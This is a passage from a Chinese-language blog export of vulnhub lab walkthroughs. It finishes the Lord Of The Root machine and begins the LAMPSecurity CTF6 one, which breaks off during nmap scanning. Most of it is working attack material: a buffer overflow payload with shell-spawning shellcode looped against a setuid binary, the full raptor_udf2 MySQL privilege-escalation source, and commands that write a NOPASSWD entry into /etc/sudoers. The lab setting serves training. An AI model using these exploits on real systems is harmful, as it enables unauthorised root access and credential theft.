<p>如上所示，检查了寄存器，发现EIP现在已被0x42424242覆盖，该十六进制转换为BBBB。现在可以控制EIP！进一步的枚举告诉我还启用了ASLR：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">smeagol@LordOfTheRoot:~/Desktop$ cat /proc/sys/kernel/randomize_va_space</span><br><span class="line">cat /proc/sys/kernel/randomize_va_space</span><br><span class="line">2</span><br></pre></td></tr></table></figure>

<p>看到启用了ASLR，这将使的地址空间随机化。此外，程序中没有可使用的JMP ESP指令。使无法指定特定的EIP地址来指向shellcode。</p>
<p>但是，我的想法是，如果可以循环利用漏洞，也许可以“猜测”甚至更好，用EIP地址获得“lucky”，从而击中了shellcode。为此，需要在漏洞利用程序中添加一个较大的NOPsled，以便如果EIP确实被正确击中，则NOPsled将允许程序滑至我的shellcode。</p>
<p>再次运行payload，这次使用了2000个较大的Nopsled：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">smeagol@LordOfTheRoot:~/Desktop$ gdb -q ./file</span><br><span class="line">gdb -q ./file</span><br><span class="line">Reading symbols from ./file...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">(gdb) run $(python -c <span class="string">&#x27;print &quot;A&quot; * 171 + &quot;B&quot; * 4 + &quot;\x90&quot; * 2000&#x27;</span>)</span><br><span class="line">run $(python -c <span class="string">&#x27;print &quot;A&quot; * 171 + &quot;B&quot; * 4 + &quot;\x90&quot; * 2000&#x27;</span>)</span><br><span class="line">Starting program: /home/smeagol/Desktop/file $(python -c <span class="string">&#x27;print &quot;A&quot; * 171 + &quot;B&quot; * 4 + &quot;\x90&quot; * 2000&#x27;</span>)</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">0x42424242 <span class="keyword">in</span> ?? ()</span><br><span class="line">(gdb) x/s <span class="variable">$esp</span></span><br><span class="line">x/s <span class="variable">$esp</span></span><br><span class="line">0xbfffee70:     <span class="string">&#x27;\220&#x27;</span> &lt;repeats 200 <span class="built_in">times</span>&gt;...</span><br></pre></td></tr></table></figure>

<p>因此，仍然可以控制EIP，看来ESP指向的是其他位置，0xbfffee70,将使用它作为EIP的位置。另外，将包括shellcode。生成shell的非常常见的shellcode是：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80</span><br></pre></td></tr></table></figure>

<p>在当前的GDB会话中测试payload，以确认漏洞利用程序是否正常工作：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(gdb) run $(python -c <span class="string">&#x27;print &quot;A&quot; * 171 + &quot;\x70\xee\xff\xbf&quot; + &quot;\x90&quot; * 2000 + &quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80&quot;&#x27;</span>)</span><br><span class="line">The program being debugged has been started already.</span><br><span class="line">Start it from the beginning? (y or n) y</span><br><span class="line"></span><br><span class="line">Starting program: /tmp/file $(python -c <span class="string">&#x27;print &quot;A&quot; * 171 + &quot;\x70\xee\xff\xbf&quot; + &quot;\x90&quot; * 2000 + &quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80&quot;&#x27;</span>)</span><br><span class="line">process 30271 is executing new program: /bin/dash</span><br><span class="line">$ id</span><br><span class="line">uid=1000(smeagol) gid=1000(smeagol) groups=1000(smeagol)</span><br><span class="line">$ whoami</span><br><span class="line">smeagol</span><br></pre></td></tr></table></figure>

<p>优秀！产生了一个shell。但是，以smeagol的身份运行，而不是以root用户身份运行，因为这只是我复制下来的文件。另外，请务必注意，我的EIP地址位置“\x70\xee\xff\xbf”<br>由于字节序少，所以反向写入。</p>
<p>现在，我知道我的漏洞利用程序有用，现在是时候将该漏洞循环到真实环境中了。使用以下脚本来完成此任务：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> &#123;1..1000&#125;; <span class="keyword">do</span> ./file $(python -c <span class="string">&#x27;print &quot;A&quot; * 171 + &quot;\x70\xee\xff\xbf&quot; + &quot;\x90&quot; * 2000 + &quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80&quot;&#x27;</span>); <span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<p>准备好漏洞利用程序后，回到/SECRET/目录并找到适当的文件并执行脚本：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">smeagol@LordOfTheRoot:/SECRET$ file door1/file door2/file door3/file</span><br><span class="line">door1/file: setuid ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), <span class="keyword">for</span> GNU/Linux 2.6.24, BuildID[sha1]=364b5cbb85546e36256039ce4599eee471bfbf86, not stripped</span><br><span class="line">door2/file: setuid ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), <span class="keyword">for</span> GNU/Linux 2.6.24, BuildID[sha1]=364b5cbb85546e36256039ce4599eee471bfbf86, not stripped</span><br><span class="line">door3/file: setuid ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), <span class="keyword">for</span> GNU/Linux 2.6.24, BuildID[sha1]=9e50c7cacaf5cc2c78214c81f110c88e61ad0c10, not stripped</span><br></pre></td></tr></table></figure>
<p>运行下面的命令，成功提权如下所示。。。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> &#123;1..1000&#125;; <span class="keyword">do</span> /SECRET/door3/file $(python -c <span class="string">&#x27;print &quot;A&quot; * 171 + &quot;\x70\xee\xff\xbf&quot; + &quot;\x90&quot; * 2000 + &quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80&quot;&#x27;</span>); <span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Segmentation fault (core dumped)</span><br><span class="line">Segmentation fault (core dumped)</span><br><span class="line">Segmentation fault (core dumped)</span><br><span class="line">Segmentation fault (core dumped)</span><br><span class="line">Segmentation fault (core dumped)</span><br><span class="line">Segmentation fault (core dumped)</span><br><span class="line">Segmentation fault (core dumped)</span><br><span class="line">Segmentation fault (core dumped)</span><br><span class="line">Segmentation fault (core dumped)</span><br><span class="line">Segmentation fault (core dumped)</span><br><span class="line">Segmentation fault (core dumped)</span><br><span class="line">Segmentation fault (core dumped)</span><br><span class="line">Segmentation fault (core dumped)</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">uid=1000(smeagol) gid=1000(smeagol) euid=0(root) groups=0(root),1000(smeagol)</span><br><span class="line"><span class="comment"># whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure>

<p>读取flag</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># cd /root</span></span><br><span class="line"><span class="comment"># ls                                                                                                                                                                                                                                       </span></span><br><span class="line">Flag.txt  buf  buf.c  other  other.c  switcher.py                                                                                                                                                                                          </span><br><span class="line"><span class="comment"># cat Flag.txt                                                                                                                                                                                                                             </span></span><br><span class="line">“There is only one Lord of the Ring, only one who can bend it to his will. And he does not share power.”                                                                                                                                   </span><br><span class="line">– Gandalf</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub186.jpg"></p>
<h3 id="提权3-mysql-udf提权"><a href="#提权3-mysql-udf提权" class="headerlink" title="提权3:mysql-udf提权"></a>提权3:mysql-udf提权</h3><p>使用sqlmap dump出mysql的用户名和密码的hash值，之前的步骤略</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># sqlmap -u http://192.168.56.113:1337/978345210/index.php --forms --batch -D mysql -T user --dump</span></span><br><span class="line">root             | &lt;blank&gt; | *4DD56158ACDBA81BFE3FF9D3D7375231596CE10F |</span><br><span class="line">root             | &lt;blank&gt; | *4DD56158ACDBA81BFE3FF9D3D7375231596CE10F |</span><br><span class="line">debian-sys-maint | &lt;blank&gt; | *4DD56158ACDBA81BFE3FF9D3D7375231596CE10F | </span><br><span class="line">root             | &lt;blank&gt; | *A55A9B9049F69BC2768C9284615361DFBD580B34 |</span><br><span class="line">root             | &lt;blank&gt; | *4DD56158ACDBA81BFE3FF9D3D7375231596CE10F |</span><br></pre></td></tr></table></figure>

<p>解密出</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">*4DD56158ACDBA81BFE3FF9D3D7375231596CE10F</span><br></pre></td></tr></table></figure>

<p>的值是darkshadow<br>然后用之前的账号和密码先连接ssh</p>
<p>searchsploit搜索mysql udf提权exploit</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># searchsploit User-Defined Function</span></span><br><span class="line">---------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line"> Exploit Title                                                                    |  Path</span><br><span class="line">                                                                                  | (/usr/share/exploitdb/)</span><br><span class="line">---------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line">Microsoft Edge Chakra JIT - Op_MaxInAnArray and Op_MinInAnArray can Explicitly ca | exploits/windows/dos/43466.js</span><br><span class="line">MySQL 4.0.17 (Linux) - User-Defined Function (UDF) Dynamic Library (1)            | exploits/linux/<span class="built_in">local</span>/1181.c</span><br><span class="line">MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library (2)           | exploits/linux/<span class="built_in">local</span>/1518.c</span><br><span class="line">MySQL 4.x/5.0 (Windows) - User-Defined Function Command Execution                 | exploits/windows/remote/3274.txt</span><br><span class="line">---------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line">Shellcodes: No Result</span><br><span class="line">root@kali:~<span class="comment"># cat /usr/share/exploitdb/exploits/linux/local/1518.c</span></span><br><span class="line">/*</span><br><span class="line"> * <span class="variable">$Id</span>: raptor_udf2.c,v 1.1 2006/01/18 17:58:54 raptor Exp $</span><br><span class="line"> *</span><br><span class="line"> * raptor_udf2.c - dynamic library <span class="keyword">for</span> do_system() MySQL UDF</span><br><span class="line"> * Copyright (c) 2006 Marco Ivaldi &lt;raptor@0xdeadbeef.info&gt;</span><br><span class="line"> *</span><br><span class="line"> * This is an helper dynamic library <span class="keyword">for</span> <span class="built_in">local</span> privilege escalation through</span><br><span class="line"> * MySQL run with root privileges (very bad idea!), slightly modified to work </span><br><span class="line"> * with newer versions of the open-source database. Tested on MySQL 4.1.14.</span><br><span class="line"> *</span><br><span class="line"> * See also: http://www.0xdeadbeef.info/exploits/raptor_udf.c</span><br><span class="line"> *</span><br><span class="line"> * Starting from MySQL 4.1.10a and MySQL 4.0.24, newer releases include fixes</span><br><span class="line"> * <span class="keyword">for</span> the security vulnerabilities <span class="keyword">in</span> the handling of User Defined Functions</span><br><span class="line"> * (UDFs) reported by Stefano Di Paola &lt;stefano.dipaola@wisec.it&gt;. For further</span><br><span class="line"> * details, please refer to:</span><br><span class="line"> *</span><br><span class="line"> * http://dev.mysql.com/doc/refman/5.0/en/udf-security.html</span><br><span class="line"> * http://www.wisec.it/vulns.php?page=4</span><br><span class="line"> * http://www.wisec.it/vulns.php?page=5</span><br><span class="line"> * http://www.wisec.it/vulns.php?page=6</span><br><span class="line"> *</span><br><span class="line"> * <span class="string">&quot;UDFs should have at least one symbol defined in addition to the xxx symbol </span></span><br><span class="line"><span class="string"> * that corresponds to the main xxx() function. These auxiliary symbols </span></span><br><span class="line"><span class="string"> * correspond to the xxx_init(), xxx_deinit(), xxx_reset(), xxx_clear(), and </span></span><br><span class="line"><span class="string"> * xxx_add() functions&quot;</span>. -- User Defined Functions Security Precautions </span><br><span class="line"> *</span><br><span class="line"> * Usage:</span><br><span class="line"> * $ id</span><br><span class="line"> * uid=500(raptor) gid=500(raptor) groups=500(raptor)</span><br><span class="line"> * $ gcc -g -c raptor_udf2.c</span><br><span class="line"> * $ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc</span><br><span class="line"> * $ mysql -u root -p</span><br><span class="line"> * Enter password:</span><br><span class="line"> * [...]</span><br><span class="line"> * mysql&gt; use mysql;</span><br><span class="line"> * mysql&gt; create table foo(line blob);</span><br><span class="line"> * mysql&gt; insert into foo values(load_file(<span class="string">&#x27;/home/raptor/raptor_udf2.so&#x27;</span>));</span><br><span class="line"> * mysql&gt; select * from foo into dumpfile <span class="string">&#x27;/usr/lib/raptor_udf2.so&#x27;</span>;</span><br><span class="line"> * mysql&gt; create <span class="keyword">function</span> do_system returns <span class="built_in">integer</span> soname <span class="string">&#x27;raptor_udf2.so&#x27;</span>;</span><br><span class="line"> * mysql&gt; select * from mysql.func;</span><br><span class="line"> * +-----------+-----+----------------+----------+</span><br><span class="line"> * | name      | ret | dl             | <span class="built_in">type</span>     |</span><br><span class="line"> * +-----------+-----+----------------+----------+</span><br><span class="line"> * | do_system |   2 | raptor_udf2.so | <span class="keyword">function</span> |</span><br><span class="line"> * +-----------+-----+----------------+----------+</span><br><span class="line"> * mysql&gt; select do_system(<span class="string">&#x27;id &gt; /tmp/out; chown raptor.raptor /tmp/out&#x27;</span>);</span><br><span class="line"> * mysql&gt; \! sh</span><br><span class="line"> * sh-2.05b$ cat /tmp/out</span><br><span class="line"> * uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm)</span><br><span class="line"> * [...]</span><br><span class="line"> *</span><br><span class="line"> * E-DB Note: Keep an eye on https://github.com/mysqludf/lib_mysqludf_sys</span><br><span class="line"> *</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"></span><br><span class="line">enum Item_result &#123;STRING_RESULT, REAL_RESULT, INT_RESULT, ROW_RESULT&#125;;</span><br><span class="line"></span><br><span class="line">typedef struct st_udf_args &#123;</span><br><span class="line">        unsigned int            arg_count;      // number of arguments</span><br><span class="line">        enum Item_result        *arg_type;      // pointer to item_result</span><br><span class="line">        char                    **args;         // pointer to arguments</span><br><span class="line">        unsigned long           *lengths;       // length of string args</span><br><span class="line">        char                    *maybe_null;    // 1 <span class="keyword">for</span> maybe_null args</span><br><span class="line">&#125; UDF_ARGS;</span><br><span class="line"></span><br><span class="line">typedef struct st_udf_init &#123;</span><br><span class="line">        char                    maybe_null;     // 1 <span class="keyword">if</span> func can <span class="built_in">return</span> NULL</span><br><span class="line">        unsigned int            decimals;       // <span class="keyword">for</span> real <span class="built_in">functions</span></span><br><span class="line">        unsigned long           max_length;     // <span class="keyword">for</span> string <span class="built_in">functions</span></span><br><span class="line">        char                    *ptr;           // free ptr <span class="keyword">for</span> func data</span><br><span class="line">        char                    const_item;     // 0 <span class="keyword">if</span> result is constant</span><br><span class="line">&#125; UDF_INIT;</span><br><span class="line"></span><br><span class="line">int do_system(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">if</span> (args-&gt;arg_count != 1)</span><br><span class="line">                <span class="built_in">return</span>(0);</span><br><span class="line"></span><br><span class="line">        system(args-&gt;args[0]);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">return</span>(0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">char do_system_init(UDF_INIT *initid, UDF_ARGS *args, char *message)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="built_in">return</span>(0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// milw0rm.com [2006-02-20]</span><br></pre></td></tr></table></figure>

<p>将下面的代码命名为raptor_udf2.c</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"></span><br><span class="line">enum Item_result &#123;STRING_RESULT, REAL_RESULT, INT_RESULT, ROW_RESULT&#125;;</span><br><span class="line"></span><br><span class="line">typedef struct st_udf_args &#123;</span><br><span class="line">        unsigned int            arg_count;      // number of arguments</span><br><span class="line">        enum Item_result        *arg_type;      // pointer to item_result</span><br><span class="line">        char                    **args;         // pointer to arguments</span><br><span class="line">        unsigned long           *lengths;       // length of string args</span><br><span class="line">        char                    *maybe_null;    // 1 <span class="keyword">for</span> maybe_null args</span><br><span class="line">&#125; UDF_ARGS;</span><br><span class="line"></span><br><span class="line">typedef struct st_udf_init &#123;</span><br><span class="line">        char                    maybe_null;     // 1 <span class="keyword">if</span> func can <span class="built_in">return</span> NULL</span><br><span class="line">        unsigned int            decimals;       // <span class="keyword">for</span> real <span class="built_in">functions</span></span><br><span class="line">        unsigned long           max_length;     // <span class="keyword">for</span> string <span class="built_in">functions</span></span><br><span class="line">        char                    *ptr;           // free ptr <span class="keyword">for</span> func data</span><br><span class="line">        char                    const_item;     // 0 <span class="keyword">if</span> result is constant</span><br><span class="line">&#125; UDF_INIT;</span><br><span class="line"></span><br><span class="line">int do_system(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">if</span> (args-&gt;arg_count != 1)</span><br><span class="line">                <span class="built_in">return</span>(0);</span><br><span class="line"></span><br><span class="line">        system(args-&gt;args[0]);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">return</span>(0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">char do_system_init(UDF_INIT *initid, UDF_ARGS *args, char *message)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="built_in">return</span>(0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>执行下面命令编译</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">smeagol@LordOfTheRoot:~$ gcc -g -c raptor_udf2.c</span><br><span class="line">smeagol@LordOfTheRoot:~$ gcc -g -shared -Wl,-soname,raptor_udf2.so -oraptor_udf2.so raptor_udf2.o -lc</span><br><span class="line">smeagol@LordOfTheRoot:~$ ls</span><br><span class="line">39166.c  Documents  examples.desktop  Music     Public         raptor_udf2.o   Templates</span><br><span class="line">Desktop  Downloads  exp               Pictures  raptor_udf2.c  raptor_udf2.so  Videos</span><br></pre></td></tr></table></figure>

<p>最后连接mysql数据库执行下面命令提权</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">smeagol@LordOfTheRoot:~$ mysql -uroot -pdarkshadow</span><br><span class="line">Welcome to the MySQL monitor.  Commands end with ; or \g.</span><br><span class="line">Your MySQL connection id is 9781</span><br><span class="line">Server version: 5.5.44-0ubuntu0.14.04.1 (Ubuntu)</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2015, Oracle and/or its affiliates. All rights reserved.</span><br><span class="line"></span><br><span class="line">Oracle is a registered trademark of Oracle Corporation and/or its</span><br><span class="line">affiliates. Other names may be trademarks of their respective</span><br><span class="line">owners.</span><br><span class="line"></span><br><span class="line">Type <span class="string">&#x27;help;&#x27;</span> or <span class="string">&#x27;\h&#x27;</span> <span class="keyword">for</span> <span class="built_in">help</span>. Type <span class="string">&#x27;\c&#x27;</span> to clear the current input statement.</span><br><span class="line"></span><br><span class="line">mysql&gt; use mysql;</span><br><span class="line">Reading table information <span class="keyword">for</span> completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup with -A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; create table foo(line blob);</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; insert into foo values(load_file(<span class="string">&#x27;/home/smeagol/raptor_udf2.so&#x27;</span>));</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from foo into dumpfile <span class="string">&#x27;/usr/lib/mysql/plugin/raptor_udf2.so&#x27;</span>;</span><br><span class="line">Query OK, 1 row affected (0.08 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; create <span class="keyword">function</span> do_system returns <span class="built_in">integer</span> soname <span class="string">&#x27;raptor_udf2.so&#x27;</span>;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from mysql.func;</span><br><span class="line">+-----------+-----+----------------+----------+</span><br><span class="line">| name      | ret | dl             | <span class="built_in">type</span>     |</span><br><span class="line">+-----------+-----+----------------+----------+</span><br><span class="line">| do_system |   2 | raptor_udf2.so | <span class="keyword">function</span> |</span><br><span class="line">+-----------+-----+----------------+----------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select do_system(<span class="string">&#x27;echo &quot;smeagol ALL =(ALL) NOPASSWD: ALL&quot; &gt;&gt; /etc/sudoers&#x27;</span>);</span><br><span class="line">+----------------------------------------------------------------------+</span><br><span class="line">| do_system(<span class="string">&#x27;echo &quot;smeagol ALL =(ALL) NOPASSWD: ALL&quot; &gt;&gt; /etc/sudoers&#x27;</span>) |</span><br><span class="line">+----------------------------------------------------------------------+</span><br><span class="line">|                                                                    0 |</span><br><span class="line">+----------------------------------------------------------------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.02 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; quit</span><br><span class="line">Bye</span><br><span class="line">smeagol@LordOfTheRoot:~$ sudo bash</span><br><span class="line">root@LordOfTheRoot:~<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">root@LordOfTheRoot:~<span class="comment"># whoami</span></span><br><span class="line">root</span><br><span class="line">root@LordOfTheRoot:~<span class="comment"># cd /root</span></span><br><span class="line">root@LordOfTheRoot:/root<span class="comment"># ls</span></span><br><span class="line">buf  buf.c  Flag.txt  other  other.c  switcher.py</span><br><span class="line">root@LordOfTheRoot:/root<span class="comment"># cat Flag.txt </span></span><br><span class="line">“There is only one Lord of the Ring, only one who can bend it to his will. And he does not share power.”</span><br><span class="line">– Gandalf</span><br><span class="line">root@LordOfTheRoot:/root<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>可以看到，成功的提权了</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub187.jpg"></p>
<h4 id="知识点总结"><a href="#知识点总结" class="headerlink" title="知识点总结"></a>知识点总结</h4><ul>
<li>端口碰撞</li>
<li>sql注入时间盲注</li>
<li>“overlayfs”本地权限提升</li>
<li>利用SUID利用root拥有的二进制文件提权</li>
<li>gdb调试得到python shellcode的poc</li>
<li>mysql-udf提权</li>
</ul>
<p><font color="red">Game over</font></p>
<p>不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this…It’s a pity…</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg"></p>
<p><font color="green"><strong><em>The end,to be continue…</em></strong></font></p>
]]></content>
      <categories>
        <category>vulnhub walkthrough</category>
      </categories>
      <tags>
        <tag>vulnhub靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机渗透[LAMPSecurity-CTF6]</title>
    <url>/2019/12/16/LAMPSecurity-CTF6/</url>
    <content><![CDATA[<p>名称：LAMPSecurity-CTF6<br>发布日期：2009年6月29日</p>
<p>下载：</p>
<ul>
<li>Download: <span class="exturl" data-url="aHR0cDovL3NvdXJjZWZvcmdlLm5ldC9wcm9qZWN0cy9sYW1wc2VjdXJpdHkvZmlsZXMvQ2FwdHVyZVRoZUZsYWcvQ1RGNi9sYW1wc2VjdXJpdHlfY3RmNi56aXAvZG93bmxvYWQ=">http://sourceforge.net/projects/lampsecurity/files/CaptureTheFlag/CTF6/lampsecurity_ctf6.zip/download<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9sYW1wc2VjdXJpdHkvY3RmNi56aXA=">https://download.vulnhub.com/lampsecurity/ctf6.zip<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9sYW1wc2VjdXJpdHkvY3RmNi56aXAudG9ycmVudA==">https://download.vulnhub.com/lampsecurity/ctf6.zip.torrent<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>描述：</p>
<p>LAMPSecurity项目旨在产生可用于培训信息安全专业人员和测试产品的培训和基准测试工具。 请注意，还有其他捕获flag练习（不仅仅是最新的一种）。 检查SourceForge站点以找到其他可用的练习（<span class="exturl" data-url="aHR0cDovL3NvdXJjZWZvcmdlLm5ldC9wcm9qZWN0cy9sYW1wc2VjdXJpdHkvZmlsZXMvQ2FwdHVyZVRoZUZsYWcvJUVGJUJDJTg5JUUzJTgwJTgy">http://sourceforge.net/projects/lampsecurity/files/CaptureTheFlag/）。<i class="fa fa-external-link-alt"></i></span></p>
<p>通过遵循本文档，可以将这些练习用于培训目的。 另外，您可能希望使用CTF虚拟机作为目标来测试新工具。 这对于评估漏洞发现或渗透测试工具的有效性特别有用。</p>
<a id="more"></a>

<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>上nmap</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sn -v 192.168.142.0/24</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.142.129</span><br><span class="line">Host is up (0.00034s latency).</span><br><span class="line">MAC Address: 00:0C:29:32:79:F3 (VMware)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -A -v -sV -Pn -T4 --script=vuln 192.168.142.129</span></span><br><span class="line">PORT     STATE SERVICE    VERSION</span><br><span class="line">22/tcp   open  ssh        OpenSSH 4.3 (protocol 2.0)</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">| vulners: </span><br><span class="line">|   cpe:/a:openbsd:openssh:4.3: </span><br><span class="line">|       CVE-2006-5051   9.3     https://vulners.com/cve/CVE-2006-5051</span><br><span class="line">|       CVE-2006-4924   7.8     https://vulners.com/cve/CVE-2006-4924</span><br><span class="line">|       CVE-2014-1692   7.5     https://vulners.com/cve/CVE-2014-1692</span><br><span class="line">|       CVE-2010-4478   7.5     https://vulners.com/cve/CVE-2010-4478</span><br><span class="line">|       CVE-2007-4752   7.5     https://vulners.com/cve/CVE-2007-4752</span><br><span class="line">|       CVE-2009-2904   6.9     https://vulners.com/cve/CVE-2009-2904</span><br><span class="line">|       CVE-2017-15906  5.0     https://vulners.com/cve/CVE-2017-15906</span><br><span class="line">|       CVE-2016-10708  5.0     https://vulners.com/cve/CVE-2016-10708</span><br><span class="line">|       CVE-2010-5107   5.0     https://vulners.com/cve/CVE-2010-5107</span><br><span class="line">|       CVE-2008-4109   5.0     https://vulners.com/cve/CVE-2008-4109</span><br><span class="line">|       CVE-2007-2243   5.0     https://vulners.com/cve/CVE-2007-2243</span><br><span class="line">|       CVE-2006-5052   5.0     https://vulners.com/cve/CVE-2006-5052</span><br><span class="line">|       CVE-2010-4755   4.0     https://vulners.com/cve/CVE-2010-4755</span><br><span class="line">|       CVE-2012-0814   3.5     https://vulners.com/cve/CVE-2012-0814</span><br><span class="line">|       CVE-2011-5000   3.5     https://vulners.com/cve/CVE-2011-5000</span><br><span class="line">|       CVE-2011-4327   2.1     https://vulners.com/cve/CVE-2011-4327</span><br><span class="line">|_      CVE-2008-3259   1.2     https://vulners.com/cve/CVE-2008-3259</span><br><span class="line">80/tcp   open  http       Apache httpd 2.2.3 ((CentOS))</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_http-aspnet-debug: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">| http-cookie-flags: </span><br><span class="line">|   /: </span><br><span class="line">|     PHPSESSID: </span><br><span class="line">|_      httponly flag not <span class="built_in">set</span></span><br><span class="line">| http-csrf: </span><br><span class="line">| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.142.129</span><br><span class="line">|   Found the following possible CSRF vulnerabilities: </span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.142.129:80/mail/</span><br><span class="line">|     Form id: rcmlogintz</span><br><span class="line">|     Form action: ./</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.142.129:80/?action=login</span><br><span class="line">|     Form id: </span><br><span class="line">|     Form action: ?action=login</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.142.129:80/mail/?_task=mail</span><br><span class="line">|     Form id: rcmlogintz</span><br><span class="line">|     Form action: ./</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.142.129:80/mail/</span><br><span class="line">|     Form id: rcmlogintz</span><br><span class="line">|_    Form action: ./</span><br><span class="line">|_http-dombased-xss: Couldn<span class="string">&#x27;t find any DOM based XSS.</span></span><br><span class="line"><span class="string">| http-enum: </span></span><br><span class="line"><span class="string">|   /mail/: Mail folder</span></span><br><span class="line"><span class="string">|   /logs/: Logs (401 Authorization Required)</span></span><br><span class="line"><span class="string">|   /phpmyadmin/: 